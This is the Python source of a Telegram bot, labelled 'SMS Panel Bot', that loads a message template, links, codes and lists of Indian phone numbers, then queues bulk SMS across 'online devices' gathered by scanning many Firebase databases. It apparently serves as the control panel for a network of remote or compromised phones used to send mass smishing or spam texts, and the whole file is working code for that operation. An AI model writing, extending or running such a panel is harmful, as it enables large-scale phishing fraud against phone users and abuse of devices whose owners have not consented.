from typing import Any
import os

from .config import ADMIN_CHAT_ID, STATE_URL, STATE_ROOT, FIREBASE_URLS
from .store import rget, rput
from . import telegram_api as tg
from . import keyboards as kb
from .devices import scan_all_devices
from .sms import enqueue_sms_batch, normalize_number
from .telegram_api import download_file, get_file


def _state_path(chat_id: int) -> str:
    return f"{STATE_ROOT}/{chat_id}"


async def get_state(chat_id: int) -> dict:
    s = await rget(STATE_URL, _state_path(chat_id))
    return s if isinstance(s, dict) else {}


async def save_state(chat_id: int, data: dict) -> bool:
    return await rput(STATE_URL, _state_path(chat_id), data)


async def merge_state(chat_id: int, patch: dict):
    s = await get_state(chat_id)
    s.update(patch)
    await save_state(chat_id, s)
    return s


def is_admin(chat_id: int) -> bool:
    if not ADMIN_CHAT_ID:
        return True
    return str(chat_id) == str(ADMIN_CHAT_ID)


async def welcome(chat_id: int):
    s = await get_state(chat_id)
    template = (s.get("template") or "")[:40] or "(not set)"
    numbers = len(s.get("numbers") or [])
    codes = len(s.get("codes") or [])
    link = s.get("link") or "(not set)"
    text = (
        "🤖 <b>SMS Panel Bot</b>\n\n"
        f"📝 Template: <code>{template}</code>\n"
        f"📱 Numbers: <b>{numbers}</b>\n"
        f"🔢 Codes: <b>{codes}</b>\n"
        f"🔗 Link: <code>{link}</code>\n\n"
        "Pick an option below."
    )
    await tg.send_message(chat_id, text, reply_markup=kb.main_menu())


async def handle_callback(update: dict):
    cb = update["callback_query"]
    chat_id = cb["message"]["chat"]["id"]
    msg_id = cb["message"]["message_id"]
    data = cb.get("data", "")

    if not is_admin(chat_id):
        await tg.answer_callback(cb["id"], "Not authorized.", True)
        return

    if data == kb.BTN_BACK:
        await tg.answer_callback(cb["id"])
        await welcome(chat_id)
        return

    if data == kb.BTN_TEMPLATE:
        await merge_state(chat_id, {"awaiting": "template"})
        await tg.answer_callback(cb["id"])
        await tg.edit_message(
            chat_id, msg_id,
            "📝 Send the message template.\n\n"
            "Optional placeholders: <code>{code}</code>, <code>{link}</code>.\n"
            "If omitted they get appended automatically.",
            reply_markup=kb.back_menu()
        )
        return

    if data == kb.BTN_LINK:
        await merge_state(chat_id, {"awaiting": "link"})
        await tg.answer_callback(cb["id"])
        await tg.edit_message(
            chat_id, msg_id,
            "🔗 Send the link to attach.\nSend <code>-</code> to clear.",
            reply_markup=kb.back_menu()
        )
        return

    if data == kb.BTN_NUMBERS:
        await merge_state(chat_id, {"awaiting": "numbers"})
        await tg.answer_callback(cb["id"])
        await tg.edit_message(
            chat_id, msg_id,
            "📱 Upload a <b>.txt</b> file — one 10-digit number per line "
            "(no country code). +91 added automatically.",
            reply_markup=kb.back_menu()
        )
        return

    if data == kb.BTN_CODES:
        await merge_state(chat_id, {"awaiting": "codes"})
        await tg.answer_callback(cb["id"])
        await tg.edit_message(
            chat_id, msg_id,
            "🔢 Upload a <b>.txt</b> file — one code per line.\n"
            "Codes are cycled into messages.",
            reply_markup=kb.back_menu()
        )
        return

    if data == kb.BTN_DEVICES:
        await tg.answer_callback(cb["id"], "Scanning…")
        await tg.edit_message(chat_id, msg_id, "🔥 Scanning firebase databases…")
        pool = await scan_all_devices()
        if not pool:
            txt = (f"🔥 <b>Devices</b>\n\nNo online devices found across "
                   f"<b>{len(FIREBASE_URLS)}</b> databases.")
        else:
            by_url = {}
            for d in pool:
                by_url.setdefault(d["url"], []).append(d["id"])
            lines = [f"🔥 <b>Devices online:</b> {len(pool)}\n"]
            for u, ids in list(by_url.items())[:20]:
                host = u.replace("https://", "").split(".")[0]
                lines.append(f"• <b>{host}</b>: {len(ids)}")
            if len(by_url) > 20:
                lines.append(f"… +{len(by_url) - 20} more dbs")
            txt = "\n".join(lines)
        await tg.edit_message(chat_id, msg_id, txt, reply_markup=kb.back_menu())
        return

    if data == kb.BTN_STATUS:
        s = await get_state(chat_id)
        txt = (
            "📊 <b>Status</b>\n\n"
            f"📝 Template: <code>{(s.get('template') or '(not set)')[:200]}</code>\n"
            f"📱 Numbers: <b>{len(s.get('numbers') or [])}</b>\n"
            f"🔢 Codes: <b>{len(s.get('codes') or [])}</b>\n"
            f"🔗 Link: <code>{s.get('link') or '(not set)'}</code>\n"
            f"🌐 Firebase DBs: <b>{len(FIREBASE_URLS)}</b>"
        )
        await tg.answer_callback(cb["id"])
        await tg.edit_message(chat_id, msg_id, txt, reply_markup=kb.back_menu())
        return

    if data == kb.BTN_SEND:
        await tg.answer_callback(cb["id"], "Sending…")
        s = await get_state(chat_id)
        template = s.get("template") or ""
        numbers = s.get("numbers") or []
        codes = s.get("codes") or []
        link = s.get("link") or None
        if not template:
            await tg.edit_message(chat_id, msg_id, "❌ No template set.",
                                  reply_markup=kb.back_menu())
            return
        if not numbers:
            await tg.edit_message(chat_id, msg_id, "❌ No numbers uploaded.",
                                  reply_markup=kb.back_menu())
            return
        await tg.edit_message(chat_id, msg_id, "🔥 Fetching online devices…")
        devices = await scan_all_devices()
        if not devices:
            await tg.edit_message(chat_id, msg_id, "❌ No online devices.",
                                  reply_markup=kb.back_menu())
            return
        await tg.edit_message(
            chat_id, msg_id,
            f"🚀 Enqueueing <b>{len(numbers)}</b> SMS across <b>{len(devices)}</b> devices…"
        )
        result = await enqueue_sms_batch(devices, numbers, codes, template, link)
        txt = (
            f"✅ <b>Enqueued:</b> {result['queued']} / {len(numbers)}\n"
            f"🔥 Devices used: {len(devices)}\n"
            f"⏱ Rate: 2 SMS/sec (500ms stagger)\n"
        )
        if result["errors"]:
            txt += f"\n⚠️ Errors: {len(result['errors'])}\n"
            txt += "\n".join(f"• <code>{e}</code>" for e in result["errors"])
        await tg.edit_message(chat_id, msg_id, txt, reply_markup=kb.back_menu())
        return

    await tg.answer_callback(cb["id"])


async def _parse_txt_numbers(data: bytes):
    text = data.decode("utf-8", errors="ignore")
    out, seen = [], set()
    for line in text.splitlines():
        n = normalize_number(line.strip())
        if n and n not in seen:
            seen.add(n)
            out.append(n)
    return out


async def _parse_txt_codes(data: bytes):
    text = data.decode("utf-8", errors="ignore")
    out, seen = [], set()
    for line in text.splitlines():
        c = line.strip()
        if c and c not in seen:
            seen.add(c)
            out.append(c)
    return out


async def handle_message(update: dict):
    msg = update.get("message") or {}
    chat = msg.get("chat", {})
    chat_id = chat.get("id")
    if chat_id is None:
        return
    if not is_admin(chat_id):
        await tg.send_message(chat_id, "Not authorized.")
        return

    text = msg.get("text") or ""
    doc = msg.get("document")

    if text.startswith("/start") or text.startswith("/menu"):
        await welcome(chat_id)
        return

    s = await get_state(chat_id)
    awaiting = s.get("awaiting")

    if doc:
        fname = (doc.get("file_name") or "").lower()
        if awaiting == "numbers":
            if not fname.endswith(".txt"):
                await tg.send_message(chat_id, "❌ Only .txt files.")
                return
            fi = await get_file(doc["file_id"])
            if not fi:
                await tg.send_message(chat_id, "❌ Could not fetch file.")
                return
            content = await download_file(fi["result"]["file_path"])
            if content is None:
                await tg.send_message(chat_id, "❌ Download failed.")
                return
            nums = await _parse_txt_numbers(content)
            await merge_state(chat_id, {"numbers": nums, "awaiting": None})
            await tg.send_message(
                chat_id,
                f"✅ <b>{len(nums)}</b> valid numbers loaded (+91).",
                reply_markup=kb.main_menu()
            )
            return
        if awaiting == "codes":
            if not fname.endswith(".txt"):
                await tg.send_message(chat_id, "❌ Only .txt files.")
                return
            fi = await get_file(doc["file_id"])
            if not fi:
                await tg.send_message(chat_id, "❌ Could not fetch file.")
                return
            content = await download_file(fi["result"]["file_path"])
            if content is None:
                await tg.send_message(chat_id, "❌ Download failed.")
                return
            codes = await _parse_txt_codes(content)
            await merge_state(chat_id, {"codes": codes, "awaiting": None})
            await tg.send_message(
                chat_id,
                f"✅ <b>{len(codes)}</b> codes loaded.",
                reply_markup=kb.main_menu()
            )
            return
        await tg.send_message(chat_id, "Choose Numbers or Codes first, then send .txt.")
        return

    if not text:
        return

    if awaiting == "template":
        await merge_state(chat_id, {"template": text, "awaiting": None})
        await tg.send_message(chat_id, "✅ Template saved.", reply_markup=kb.main_menu())
        return

    if awaiting == "link":
        link = None if text.strip() == "-" else text.strip()
        await merge_state(chat_id, {"link": link, "awaiting": None})
        await tg.send_message(chat_id, "✅ Link saved.", reply_markup=kb.main_menu())
        return

    await tg.send_message(chat_id, "Use /start or the menu.", reply_markup=kb.main_menu())